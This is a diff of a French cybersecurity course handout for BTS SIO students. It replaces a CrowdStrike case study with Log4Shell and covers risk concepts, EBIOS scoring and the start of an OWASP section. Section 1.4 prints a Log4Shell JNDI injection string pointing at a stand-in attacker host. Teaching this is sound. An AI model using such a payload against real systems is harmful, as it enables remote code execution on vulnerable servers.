@@ -1,519 +1,592 @@
 # SUPPORT DE COURS
-## SÃ©ance 1 â€” Cartographier la vulnÃ©rabilitÃ©
-### Analyse de risques et cybersÃ©curitÃ© du SI
+## Séance 1 – Cartographier la vulnérabilité
+### Analyse de risques et cybersécurité du SI
 
-**BTS SIO â€” Bloc 3 â€” CompÃ©tence C1 : Analyser un risque informatique**
-
----
-
-## ðŸ“‹ SOMMAIRE
-
-1. [Ã‰tude de cas : L'incident CrowdStrike (19 juillet 2024)](#1-Ã©tude-de-cas--lincident-crowdstrike)
-2. [Les 5 composants du SystÃ¨me d'Information (Laudon)](#2-les-5-composants-du-systÃ¨me-dinformation)
-3. [VulnÃ©rabilitÃ©, Menace, Risque : les fondamentaux](#3-vulnÃ©rabilitÃ©-menace-risque--les-fondamentaux)
-4. [La mÃ©thode EBIOS simplifiÃ©e](#4-la-mÃ©thode-ebios-simplifiÃ©e)
-5. [Le concept de SPOF (Single Point of Failure)](#5-le-concept-de-spof)
-6. [Introduction Ã  la cyber-rÃ©silience](#6-introduction-Ã -la-cyber-rÃ©silience)
-7. [Exercices d'application](#7-exercices-dapplication)
+**BTS SIO – Bloc 1 & 3 – Cybersécurité des services informatiques — SLAM**
 
 ---
 
-# 1. Ã‰TUDE DE CAS : L'incident CrowdStrike
+## 📋 SOMMAIRE
+
+1. [Étude de cas : L'incident Log4Shell](#1-étude-de-cas--lincident-log4shell)
+2. [Les 5 composants du Système d'Information (Laudon)](#2-les-5-composants-du-système-dinformation)
+3. [Vulnérabilité, Menace, Risque : les fondamentaux](#3-vulnérabilité-menace-risque--les-fondamentaux)
+4. [La méthode EBIOS simplifiée](#4-la-méthode-ebios-simplifiée)
+5. [OWASP Top 10 — Les 10 failles applicatives les plus graves](#5-owasp-top-10--les-10-failles-applicatives)
+6. [Le concept de SPOF (Single Point of Failure)](#6-le-concept-de-spof)
+7. [Introduction à la cybersécurité applicative](#7-introduction-à-la-cybersécurité-applicative)
+8. [Exercices d'application](#8-exercices-dapplication)
+
+---
+
+# 1. ÉTUDE DE CAS : L'INCIDENT LOG4SHELL
 
 ## 1.1 Contexte de l'incident
 
-Le **19 juillet 2024**, une panne informatique mondiale a paralysÃ© des milliers d'organisations pendant plusieurs heures. L'origine : une simple mise Ã  jour logicielle dÃ©fectueuse.
+Le **10 décembre 2021**, une **vulnérabilité critique** a été découverte dans Log4j, une librairie de journalisation utilisée par des **millions d'applications Java**.
 
-> ðŸ“˜ **CrowdStrike Falcon**
+> 📘 **Log4j**
 > 
-> Logiciel de cybersÃ©curitÃ© de type EDR (Endpoint Detection and Response) installÃ© sur des millions d'ordinateurs Windows dans le monde. Il surveille et protÃ¨ge les systÃ¨mes contre les menaces.
+> Librairie open-source très populaire pour la journalisation (enregistrement) des événements dans les applications Java. Utilisée par Minecraft, Netflix, Apple, etc.
 
-## 1.2 Chronologie des Ã©vÃ©nements
+## 1.2 Chronologie des événements
 
-| Heure (UTC) | Ã‰vÃ©nement |
-|-------------|-----------|
-| 04:09 | CrowdStrike dÃ©ploie la mise Ã  jour du fichier de canal 291 |
-| 04:09 - 05:27 | Les machines Windows redÃ©marrent avec un Ã©cran bleu (BSOD) |
-| 05:27 | CrowdStrike identifie le problÃ¨me et stoppe le dÃ©ploiement |
-| 06:00 - 12:00 | Chaos mondial : aÃ©roports, banques, hÃ´pitaux paralysÃ©s |
-| 12:00+ | DÃ©but des opÃ©rations de rÃ©cupÃ©ration manuelle |
+| Date | Événement |
+|------|-----------|
+| 10 décembre 2021 | Alerte publique sur CVE-2021-44228 |
+| 10-12 décembre | Exploitations massives observées |
+| 15 décembre | Patch de sécurité critique fourni par Apache |
+| Décembre - Janvier | Chasse aux instances vulnérables en production |
 
 ## 1.3 Impact mondial
 
-| Indicateur | Valeur | Commentaire |
-|------------|--------|-------------|
-| Machines touchÃ©es | **8,5 millions** | Environ 1% du parc Windows mondial |
-| Vols annulÃ©s | **Plus de 3 000** | Delta, United, Air France... |
-| Pertes Ã©conomiques | **5,4 milliards $** | Estimation Fortune 500 uniquement |
-| DurÃ©e de perturbation | **24 Ã  72 heures** | Selon les organisations |
+| Indicateur | Valeur | Détail |
+|-----------|--------|--------|
+| Serveurs affectés | **Millions** | Toute application Java utilisant Log4j |
+| Gravité | **CRITIQUE** | Exécution de code à distance (RCE) |
+| Délai de patch | **24-48h max** | Urgence absolue |
+| Organisations touchées | **Fortune 500** | Apple, Google, Amazon, Microsoft Cloud, etc. |
 
-> ðŸ’¡ **Organisations touchÃ©es**
+> 💡 **Organisations touchées**
 > 
-> Delta Air Lines (1 300 vols annulÃ©s, 500 M$ de pertes), NHS (hÃ´pitaux britanniques), Sky News (Ã©cran noir en direct), banques (distributeurs hors service), supermarchÃ©s (caisses bloquÃ©es).
+> Minecraft (milliards de joueurs en ligne), Netflix, Apple iCloud, Steam, Amazon Web Services, Microsoft Azure.
 
 ## 1.4 Analyse de la cause
 
-La mise Ã  jour contenait une **erreur de programmation** qui provoquait un crash du pilote (driver) Windows au dÃ©marrage. Le problÃ¨me : cette mise Ã  jour s'est dÃ©ployÃ©e **automatiquement**, sans validation prÃ©alable par les clients.
+Une **faille dans la librairie Log4j** permettait d'exécuter du code malveillant simplement en envoyant une certaine chaîne de caractères :
 
-> ðŸ”‘ **Ã€ RETENIR**
+```
+${jndi:ldap://attaquant.com/a}
+```
+
+Si cette chaîne se retrouvait dans les logs de l'application, elle était exécutée.
+
+> 🔐 À RETENIR
 > 
-> Une organisation peut Ãªtre parfaitement sÃ©curisÃ©e en interne et pourtant Ãªtre paralysÃ©e par la dÃ©faillance d'un fournisseur. C'est le risque Â« supply chain Â».
+> Une librairie populaire et "simple" peut contenir une faille catastrophale. Aucune dépendance n'est "sûre" par défaut.
 
-## 1.5 LeÃ§ons Ã  retenir
+## 1.5 Leçons à retenir
 
-- L'interdÃ©pendance des systÃ¨mes crÃ©e des **effets domino** imprÃ©visibles
-- Un fournisseur critique (comme un antivirus) peut devenir un **point de dÃ©faillance**
-- La confiance aveugle dans les mises Ã  jour automatiques est risquÃ©e
-- La prÃ©paration Ã  la crise (plans de continuitÃ©) est **essentielle**
+- Les **dépendances open-source** sont partout (supply chain risk)
+- Une seule faille dans une librairie populaire = catastrophe mondiale
+- La **gestion des patchs** est critique pour la sécurité
+- Le monitoring et la détection des exploitations sont essentiels
+- La **culture du patch** doit être imédiate pour les CRITIQUES
 
 ---
 
-# 2. LES 5 COMPOSANTS DU SYSTÃˆME D'INFORMATION
+# 2. LES 5 COMPOSANTS DU SYSTÈME D'INFORMATION
 
-## 2.1 Le modÃ¨le de Laudon & Laudon
+## 2.1 Le modèle de Laudon & Laudon
 
-Kenneth et Jane Laudon, auteurs de rÃ©fÃ©rence en systÃ¨mes d'information, proposent une vision systÃ©mique du SI articulÃ©e autour de **5 composants interdÃ©pendants**.
+Kenneth et Jane Laudon proposent une vision **systémique** du SI articulée autour de **5 composants interdépendants**.
 
-> ðŸ“˜ **SystÃ¨me d'Information (SI)**
+> 📘 **Système d'Information (SI)**
 > 
-> Ensemble organisÃ© de ressources (matÃ©riel, logiciel, donnÃ©es, procÃ©dures, personnel) permettant de collecter, stocker, traiter et diffuser l'information au sein d'une organisation.
+> Ensemble organisé de ressources (matériel, logiciel, données, procédures, personnel) permettant de collecter, stocker, traiter et diffuser l'information au sein d'une organisation.
 
-## 2.2 Les 5 composants dÃ©taillÃ©s
+## 2.2 Les 5 composants détaillés
 
 | Composant | Description | Exemples concrets |
 |-----------|-------------|-------------------|
-| **M - MatÃ©riel** (Hardware) | Infrastructure physique du SI | Serveurs, postes de travail, routeurs, switches, cÃ¢blage, onduleurs |
-| **L - Logiciel** (Software) | Programmes et applications | SystÃ¨mes d'exploitation, ERP, antivirus, applications mÃ©tier |
-| **D - DonnÃ©es** (Data) | Informations stockÃ©es et traitÃ©es | Bases de donnÃ©es, fichiers, sauvegardes, logs |
-| **P - ProcÃ©dures** (Procedures) | RÃ¨gles et processus d'utilisation | Politiques de sÃ©curitÃ©, documentation, workflows, PCA/PRA |
-| **H - Personnel** (People) | Ressources humaines du SI | Utilisateurs, administrateurs, DSI, RSSI, DPO |
+| **M - Matériel** | Infrastructure physique | Serveurs, postes, câblage, onduleurs |
+| **L - Logiciel** | Programmes et applications | OS, frameworks, librairies (Log4j), antivirus |
+| **D - Données** | Informations stockées | Bases de données, fichiers, sauvegardes, logs |
+| **P - Procédures** | Règles et processus | Politiques de sécurité, workflows, documentation |
+| **H - Humain** | Ressources humaines | Développeurs, DevOps, utilisateurs, support |
 
-> ðŸ”‘ **MnÃ©monique**
+> 🔑 **Mnémonique**
 > 
-> **MLDPP** = Â« **M**a **L**igne **D**e **P**rotection **P**ermanente Â»
+> **MLDPH** = "Ma Ligne De Protection Humaine"
 > 
-> ou simplement : MatÃ©riel - Logiciel - DonnÃ©es - ProcÃ©dures - Personnel
+> Ou simplement : Matériel - Logiciel - Données - Procédures - Human
 
-## 2.3 L'interdÃ©pendance des composants
+## 2.3 L'interdépendance des composants
 
-Le point crucial du modÃ¨le de Laudon est l'**interdÃ©pendance** : chaque composant dÃ©pend des autres pour fonctionner correctement.
+Le point crucial du modèle Laudon est l'**interdépendance** : chaque composant dépend des autres.
 
 ```
-        ðŸ–¥ï¸ MATÃ‰RIEL
-             â†•ï¸
-        ðŸ’¿ LOGICIEL
-             â†•ï¸
-        ðŸ“Š DONNÃ‰ES
-             â†•ï¸
-   ðŸ“‹ PROCÃ‰DURES  â†â†’  ðŸ‘¥ PERSONNEL
+        🖥️ MATÉRIEL
+             ↕️
+        💾 LOGICIEL
+             ↕️
+        📊 DONNÉES
+             ↕️
+   📋 PROCÉDURES  ↔️  👥 HUMAIN
 
-   Tous interconnectÃ©s : une dÃ©faillance 
+   Tous interconnectés : une défaillance 
    sur l'un impacte les autres
 ```
 
-> ðŸ’¡ **Exemple d'interdÃ©pendance (CrowdStrike)**
+> 💡 **Exemple d'interdépendance (Log4Shell)**
 > 
-> Le composant LOGICIEL (mise Ã  jour CrowdStrike) a rendu le MATÃ‰RIEL inutilisable (Ã©cran bleu), les DONNÃ‰ES inaccessibles, les PROCÃ‰DURES impossibles Ã  exÃ©cuter, et le PERSONNEL incapable de travailler.
+> Une faille LOGICIEL (Log4j) peut compromettre les DONNÉES (données clients), rendre le MATÉRIEL inutilisable, bloquer les PROCÉDURES (applications down), et rendre le HUMAIN inactif.
 
-## 2.4 Application Ã  l'analyse de risques
+## 2.4 Application à l'analyse de risques
 
-Pour analyser la sÃ©curitÃ© d'un SI, il faut examiner **CHAQUE composant** sÃ©parÃ©ment, puis leurs interactions :
+Pour analyser la sécurité d'une app, il faut examiner **CHAQUE composant** :
 
-- Le matÃ©riel est-il rÃ©cent et maintenu ?
-- Les logiciels sont-ils Ã  jour et sÃ©curisÃ©s ?
-- Les donnÃ©es sont-elles sauvegardÃ©es et protÃ©gÃ©es ?
-- Les procÃ©dures sont-elles documentÃ©es et appliquÃ©es ?
-- Le personnel est-il formÃ© et sensibilisÃ© ?
+- Le matériel est-il suffisant et maintenu ?
+- Les logiciels et dépendances sont-ils à jour ?
+- Les données sont-elles chiffrées et sauvegardées ?
+- Les procédures de sécurité sont-elles documentées ?
+- Le personnel est-il formé à la sécurité du code ?
 
 ---
 
-# 3. VULNÃ‰RABILITÃ‰, MENACE, RISQUE : LES FONDAMENTAUX
+# 3. VULNÉRABILITÉ, MENACE, RISQUE : LES FONDAMENTAUX
 
-## 3.1 DÃ©finitions essentielles
+## 3.1 Définitions essentielles
 
-> ðŸ“˜ **VulnÃ©rabilitÃ©**
+> 📘 **Vulnérabilité**
 > 
-> **Faiblesse** d'un systÃ¨me qui pourrait Ãªtre exploitÃ©e. C'est une caractÃ©ristique **intrinsÃ¨que** du systÃ¨me.
+> **Faiblesse** d'un système qui pourrait être exploitée. C'est une caractéristique **intrinsèque** du système.
 > 
-> *Exemple : un serveur non mis Ã  jour, un mot de passe faible, l'absence de sauvegarde.*
+> *Exemple : Log4j sans patch, mot de passe faible, absence de validation des entrées.*
 
-> ðŸ“˜ **Menace**
+> 📘 **Menace**
 > 
-> Ã‰vÃ©nement potentiel qui pourrait **exploiter une vulnÃ©rabilitÃ©** et causer un dommage. C'est **externe** au systÃ¨me.
+> Événement potentiel qui pourrait **exploiter une vulnérabilité** et causer un dommage. C'est **externe** au système.
 > 
-> *Exemple : un hacker, un virus, une panne Ã©lectrique, un incendie, une erreur humaine.*
+> *Exemple : un hacker, une attaque, un utilisateur malveillant, un bot.*
 
-> ðŸ“˜ **Risque**
+> 📘 **Risque**
 > 
-> Combinaison de la **probabilitÃ©** qu'une menace exploite une vulnÃ©rabilitÃ© et de l'**impact** qui en rÃ©sulterait.
+> Combinaison de la **probabilité** qu'une menace exploite une vulnérabilité et de l'**impact** qui en résulterait.
 > 
-> *Risque = VulnÃ©rabilitÃ© + Menace + Impact potentiel*
+> *Risque = Vulnérabilité + Menace + Impact potentiel*
 
 ## 3.2 La relation entre les concepts
 
-Ces trois concepts sont liÃ©s par une **chaÃ®ne causale** :
+Ces trois concepts sont liés par une **chaîne causale** :
 
 ```
-â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
-â”‚  VULNÃ‰RABILITÃ‰  â†’  exploitÃ©e par  â†’  MENACE  â†’  cause  â†’  IMPACT  =  RISQUE  â”‚
-â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
+┌─────────────────────────────────────────────────────────────┐
+│ VULNÉRABILITÉ → exploitée par → MENACE → cause → IMPACT = RISQUE │
+└─────────────────────────────────────────────────────────────┘
 ```
 
 ## 3.3 Exemples concrets
 
-| VulnÃ©rabilitÃ© | Menace | Impact | Risque |
+| Vulnérabilité | Menace | Impact | Risque |
 |---------------|--------|--------|--------|
-| Serveur non mis Ã  jour | Exploitation d'une faille connue | Prise de contrÃ´le du serveur | **Ã‰LEVÃ‰** |
-| Mot de passe faible | Attaque par force brute | AccÃ¨s non autorisÃ© aux donnÃ©es | **Ã‰LEVÃ‰** |
-| Sauvegarde sur mÃªme site | Incendie dans les locaux | Perte totale des donnÃ©es | **CRITIQUE** |
-| Personnel non formÃ© | Email de phishing | Vol d'identifiants | **Ã‰LEVÃ‰** |
-| Antivirus gratuit | Malware rÃ©cent | Infection du parc | **MODÃ‰RÃ‰** |
+| Log4j sans patch | Hacker exploitant CVE | Prise de contrôle de l'app | **CRITIQUE** |
+| Mot de passe faible | Attaque brute force | Accès aux données clients | **ÉLEVÉ** |
+| Pas de validation | Injection SQL | Lecture/modification BDD | **CRITIQUE** |
+| Dépendance outdated | Exploitation d'une faille | Compromission du code | **ÉLEVÉ** |
+| Absence de chiffrage | Interception en transit | Vol de données | **ÉLEVÉ** |
 
-> âš ï¸ **Attention**
+> ⚠️ **Attention**
 > 
-> Une vulnÃ©rabilitÃ© sans menace associÃ©e n'est pas un risque. Un serveur ancien dans une piÃ¨ce fermÃ©e Ã  clÃ© sans connexion rÃ©seau prÃ©sente peu de risques, mÃªme s'il est vulnÃ©rable.
+> Une vulnérabilité sans menace associée n'est pas un risque. Une vieille version de Log4j sur une machine isolée n'est pas un risque.
 
 ## 3.4 Formule du risque
 
-En analyse de risques, on utilise gÃ©nÃ©ralement la formule :
-
 ```
-â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
-â”‚   RISQUE = VRAISEMBLANCE Ã— IMPACT        â”‚
-â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
+┌──────────────────────────────────────────┐
+│   RISQUE = VRAISEMBLANCE × IMPACT        │
+└──────────────────────────────────────────┘
 ```
 
-- **Vraisemblance** : probabilitÃ© que la menace exploite la vulnÃ©rabilitÃ©
-- **Impact** : gravitÃ© des consÃ©quences si le risque se rÃ©alise
+- **Vraisemblance** : probabilité que la menace exploite la vulnérabilité
+- **Impact** : gravité des conséquences si le risque se réalise
 
 ---
 
-# 4. LA MÃ‰THODE EBIOS SIMPLIFIÃ‰E
+# 4. LA MÉTHODE EBIOS SIMPLIFIÉE
 
-## 4.1 PrÃ©sentation d'EBIOS
+## 4.1 Présentation d'EBIOS
 
-> ðŸ“˜ **EBIOS Risk Manager**
+> 📘 **EBIOS Risk Manager**
 > 
-> MÃ©thode franÃ§aise d'analyse de risques dÃ©veloppÃ©e par l'**ANSSI** (Agence Nationale de la SÃ©curitÃ© des SystÃ¨mes d'Information).
-> 
-> EBIOS = **E**xpression des **B**esoins et **I**dentification des **O**bjectifs de **S**Ã©curitÃ©
+> Méthode **française** officielle d'analyse de risques, recommandée par l'ANSSI (Agence Nationale de la Sécurité des Systèmes d'Information).
 
-Dans ce cours, nous utilisons une **version simplifiÃ©e** adaptÃ©e au BTS SIO, basÃ©e sur l'Ã©valuation de deux critÃ¨res : la vraisemblance et l'impact.
-
-## 4.2 Ã‰chelle de vraisemblance (V)
-
-| Niveau | LibellÃ© | Description | Exemples |
-|--------|---------|-------------|----------|
-| **1** | TrÃ¨s improbable | NÃ©cessite des moyens exceptionnels ou des circonstances trÃ¨s rares | Attaque ciblÃ©e par un Ã‰tat-nation, catastrophe naturelle majeure |
-| **2** | Peu probable | Possible mais nÃ©cessite des compÃ©tences ou circonstances particuliÃ¨res | Exploitation d'une faille 0-day, intrusion physique sophistiquÃ©e |
-| **3** | Probable | Se produit rÃ©guliÃ¨rement dans le secteur d'activitÃ© | Phishing rÃ©ussi, erreur humaine, panne matÃ©rielle courante |
-| **4** | TrÃ¨s probable | Quasi certain de se produire Ã  court terme | Exploitation d'une faille connue non corrigÃ©e, Ã©quipement en fin de vie |
-
-## 4.3 Ã‰chelle d'impact (I)
-
-| Niveau | LibellÃ© | Description | Exemples |
-|--------|---------|-------------|----------|
-| **1** | Mineur | Perturbation limitÃ©e, rÃ©cupÃ©ration rapide, pas de perte significative | IndisponibilitÃ© < 1h, donnÃ©es non sensibles concernÃ©es |
-| **2** | Significatif | Perturbation notable mais gÃ©rable, rÃ©cupÃ©ration en quelques heures | IndisponibilitÃ© < 1 jour, donnÃ©es internes exposÃ©es |
-| **3** | Grave | ArrÃªt d'activitÃ© partiel, perte de donnÃ©es clients, atteinte Ã  l'image | IndisponibilitÃ© > 1 jour, donnÃ©es personnelles compromises |
-| **4** | Critique | ArrÃªt prolongÃ©, menace sur la survie de l'entreprise | Perte donnÃ©es stratÃ©giques, sanctions RGPD, perte de clients majeurs |
-
-## 4.4 Matrice de criticitÃ©
-
-Le niveau de risque est calculÃ© en multipliant la vraisemblance par l'impact :
-
-| V \ I | Impact 1 | Impact 2 | Impact 3 | Impact 4 |
-|-------|----------|----------|----------|----------|
-| **V = 4** | 4 ðŸŸ¡ | 8 ðŸŸ  | 12 ðŸ”´ | 16 ðŸ”´ |
-| **V = 3** | 3 ðŸŸ¢ | 6 ðŸŸ¡ | 9 ðŸŸ  | 12 ðŸ”´ |
-| **V = 2** | 2 ðŸŸ¢ | 4 ðŸŸ¡ | 6 ðŸŸ¡ | 8 ðŸŸ  |
-| **V = 1** | 1 ðŸŸ¢ | 2 ðŸŸ¢ | 3 ðŸŸ¢ | 4 ðŸŸ¡ |
-
-**LÃ©gende :**
-- ðŸ”´ **CRITIQUE** (12-16)
-- ðŸŸ  **Ã‰LEVÃ‰** (8-11)
-- ðŸŸ¡ **MODÃ‰RÃ‰** (4-7)
-- ðŸŸ¢ **FAIBLE** (1-3)
-
-## 4.5 InterprÃ©tation des niveaux de risque
-
-| Niveau | Score | Action requise | DÃ©lai |
-|--------|-------|----------------|-------|
-| ðŸ”´ **CRITIQUE** | 12-16 | Action immÃ©diate, risque inacceptable | Sous 24-48h |
-| ðŸŸ  **Ã‰LEVÃ‰** | 8-11 | Action prioritaire Ã  planifier | Sous 1 mois |
-| ðŸŸ¡ **MODÃ‰RÃ‰** | 4-7 | Action Ã  moyen terme | Sous 3-6 mois |
-| ðŸŸ¢ **FAIBLE** | 1-3 | Surveillance, action si opportunitÃ© | Lors de la prochaine rÃ©vision |
-
----
-
-# 5. LE CONCEPT DE SPOF
-
-## 5.1 DÃ©finition
-
-> ðŸ“˜ **SPOF (Single Point of Failure)**
-> 
-> **Point unique de dÃ©faillance** : composant dont la panne entraÃ®ne l'arrÃªt complet d'un systÃ¨me ou d'un processus. C'est un Ã©lÃ©ment critique **sans redondance** ni plan de secours.
-
-Le terme vient de l'ingÃ©nierie de la fiabilitÃ©. Un SPOF est comme le **maillon faible** d'une chaÃ®ne : si ce maillon cÃ¨de, toute la chaÃ®ne se rompt.
-
-## 5.2 Types de SPOF
-
-| Type de SPOF | Description | Exemples |
-|--------------|-------------|----------|
-| **SPOF MatÃ©riel** | Ã‰quipement unique sans redondance | Serveur unique, routeur unique, liaison Internet unique |
-| **SPOF Logiciel** | Application critique sans alternative | ERP unique, solution de sauvegarde unique |
-| **SPOF DonnÃ©es** | DonnÃ©es sans copie de secours | Sauvegarde unique sur mÃªme site |
-| **SPOF Humain** | Personne unique dÃ©tenant un savoir critique | Technicien informatique unique, Â« l'expert qui sait tout Â» |
-| **SPOF ProcÃ©dure** | Processus sans mode dÃ©gradÃ© | Pas de procÃ©dure de secours documentÃ©e |
-
-## 5.3 Identifier les SPOF
-
-Pour chaque Ã©lÃ©ment critique du SI, posez-vous la question :
+## 4.2 Les 4 étapes d'EBIOS
 
 ```
-â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
-â”‚  Â« Si cet Ã©lÃ©ment tombe en panne, que se passe-t-il ? Â»     â”‚
-â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
+Étape 1 : Identifier les vulnérabilités
+          ↓
+Étape 2 : Évaluer la vraisemblance (V)
+          "Facile à exploiter ?"
+          ↓
+Étape 3 : Évaluer l'impact (I)
+          "Grave si exploitée ?"
+          ↓
+Étape 4 : Calculer le RISQUE = V × I
+          et prioriser les actions
 ```
 
-Si la rÃ©ponse est **Â« tout s'arrÃªte Â»** ou **Â« on ne peut plus travailler Â»**, vous avez identifiÃ© un SPOF.
+## 4.3 Scoring de la vraisemblance (V)
 
-## 5.4 Solutions contre les SPOF
+| Score | Description | Exemple |
+|-------|-------------|---------|
+| 🟢 **1** | Très difficile à exploiter | Faille théorique, nécessite conditions rares |
+| 🟡 **2** | Difficile | Exploitation possible mais complexe |
+| 🟠 **3** | Facile | Exploitation simple, peu de compétences |
+| 🔴 **4** | Très facile | Visible, automatisable, public |
 
-| Solution | Description | Exemple |
-|----------|-------------|---------|
-| **Redondance** | Dupliquer les Ã©lÃ©ments critiques | Deux serveurs en cluster, deux liaisons Internet |
-| **Haute disponibilitÃ©** | Basculement automatique en cas de panne | Serveur de secours qui prend le relais |
-| **Sauvegarde externalisÃ©e** | Copie des donnÃ©es sur un autre site | Sauvegarde cloud, datacenter de secours |
-| **Documentation** | Ã‰viter la dÃ©pendance Ã  une personne | ProcÃ©dures Ã©crites, formation croisÃ©e |
-| **Mode dÃ©gradÃ©** | Pouvoir continuer mÃªme partiellement | ProcÃ©dures papier de secours |
+**Pour Log4j sans patch :**
+- V = 4 (très facile, exploit public disponible)
 
-> ðŸ’¡ **SPOF dans l'incident CrowdStrike**
-> 
-> Pour de nombreuses organisations, CrowdStrike Ã©tait un SPOF : un logiciel unique, dÃ©ployÃ© sur tous les postes, sans alternative immÃ©diate. Quand il a dÃ©failli, tout s'est arrÃªtÃ©.
+## 4.4 Scoring de l'impact (I)
 
----
+| Score | Description | Exemple |
+|-------|-------------|---------|
+| 🟢 **1** | Mineur | Dégradation service, impact limité |
+| 🟡 **2** | Modéré | Service partiellement affecté |
+| 🟠 **3** | Majeur | Service interrompu, données affectées |
+| 🔴 **4** | Critique | Perte de contrôle, données compromises |
 
-# 6. INTRODUCTION Ã€ LA CYBER-RÃ‰SILIENCE
+**Pour Log4j avec RCE :**
+- I = 4 (exécution de code = perte totale de contrôle)
 
-## 6.1 De la sÃ©curitÃ© Ã  la rÃ©silience
+## 4.5 Matrice de risque EBIOS
 
-Traditionnellement, la cybersÃ©curitÃ© visait Ã  **empÃªcher** les incidents de se produire (prÃ©vention). Mais l'expÃ©rience montre que les incidents sont **inÃ©vitables**. D'oÃ¹ l'Ã©mergence d'un nouveau paradigme : la **cyber-rÃ©silience**.
+```
+                    Impact
+        1    2    3    4
+V 1  │  1    2    3    4
+V 2  │  2    4    6    8
+V 3  │  3    6    9   12
+V 4  │  4    8   12   16
+```
 
-> ðŸ“˜ **Cyber-rÃ©silience**
-> 
-> CapacitÃ© d'une organisation Ã  **anticiper, rÃ©sister, absorber et se rÃ©tablir** face Ã  des incidents cyber, tout en maintenant ses fonctions essentielles.
-> 
-> Ce n'est plus Â« empÃªcher l'incident Â» mais Â« **survivre Ã  l'incident** Â».
+**Interprétation :**
+- 🟢 1-3 : Risque faible → Surveiller
+- 🟡 4-7 : Risque modéré → Améliorer dans 3-6 mois
+- 🟠 8-11 : Risque élevé → Améliorer dans 1 mois
+- 🔴 12-16 : Risque CRITIQUE → ACTION IMMÉDIATE
 
-## 6.2 Les 4 piliers de la rÃ©silience
-
-| Pilier | Description | Actions concrÃ¨tes |
-|--------|-------------|-------------------|
-| **1. Anticiper** | Identifier les menaces et vulnÃ©rabilitÃ©s avant qu'elles ne soient exploitÃ©es | Analyse de risques, veille sÃ©curitÃ©, tests de pÃ©nÃ©tration |
-| **2. RÃ©sister** | Limiter l'impact d'un incident quand il survient | Segmentation rÃ©seau, dÃ©tection d'intrusion, rÃ©ponse rapide |
-| **3. Absorber** | Maintenir les fonctions essentielles malgrÃ© l'incident | Mode dÃ©gradÃ©, PCA (Plan de ContinuitÃ© d'ActivitÃ©) |
-| **4. Se rÃ©tablir** | Revenir Ã  un Ã©tat normal le plus rapidement possible | PRA (Plan de Reprise d'ActivitÃ©), sauvegardes testÃ©es |
-
-## 6.3 Indicateurs clÃ©s : RTO et RPO
-
-> ðŸ“˜ **RTO (Recovery Time Objective)**
-> 
-> **DurÃ©e maximale acceptable** d'interruption d'un service. C'est le temps qu'on se donne pour rÃ©tablir le service aprÃ¨s un incident.
-> 
-> *Exemple : RTO de 4 heures = le service doit Ãªtre rÃ©tabli en moins de 4 heures.*
-
-> ðŸ“˜ **RPO (Recovery Point Objective)**
-> 
-> **Perte de donnÃ©es maximale acceptable** en cas d'incident, exprimÃ©e en temps. C'est le Â« retour en arriÃ¨re Â» maximum tolÃ©rable.
-> 
-> *Exemple : RPO de 1 heure = on accepte de perdre au maximum 1 heure de donnÃ©es.*
-
-> ðŸ’¡ **Application des RTO/RPO**
-> 
-> Pour un site e-commerce :
-> - **RTO = 2h** (on ne peut pas rester hors ligne plus de 2h)
-> - **RPO = 15 min** (on ne peut pas perdre plus de 15 min de commandes)
-> 
-> Cela impose des sauvegardes toutes les 15 min et une infrastructure de secours activable en 2h.
-
-## 6.4 Cadre rÃ©glementaire europÃ©en
-
-La cyber-rÃ©silience est dÃ©sormais une **obligation lÃ©gale** pour de nombreuses organisations :
-
-| RÃ©glementation | Champ d'application | Obligation principale |
-|----------------|---------------------|----------------------|
-| **NIS2** (2024) | EntitÃ©s essentielles et importantes (18 secteurs) | Analyse de risques, notification 24h, tests de rÃ©silience |
-| **DORA** (2025) | Secteur financier (banques, assurances) | Tests de pÃ©nÃ©tration avancÃ©s, gestion des tiers |
-| **RGPD** (2018) | Toute organisation traitant des donnÃ©es personnelles | SÃ©curitÃ© des donnÃ©es, notification 72h en cas de violation |
-
-> ðŸ”‘ **Ã€ RETENIR**
-> 
-> La cyber-rÃ©silience n'est plus optionnelle : c'est une **exigence lÃ©gale** et un **avantage concurrentiel**. Les organisations qui peuvent dÃ©montrer leur rÃ©silience gagnent la confiance de leurs clients et partenaires.
+**Log4j : 4 × 4 = 16 → CRITIQUE**
 
 ---
 
-# 7. EXERCICES D'APPLICATION
+# 5. OWASP TOP 10 — LES 10 FAILLES APPLICATIVES LES PLUS GRAVES
 
-## Exercice 1 : Identifier les composants Laudon
+OWASP = Open Web Application Security Project (organisation de référence)
 
-Pour chaque Ã©lÃ©ment ci-dessous, indiquez le composant du SI correspondant (M, L, D, P ou H) :
+## 5.1 Les 10 catégories (2021)
 
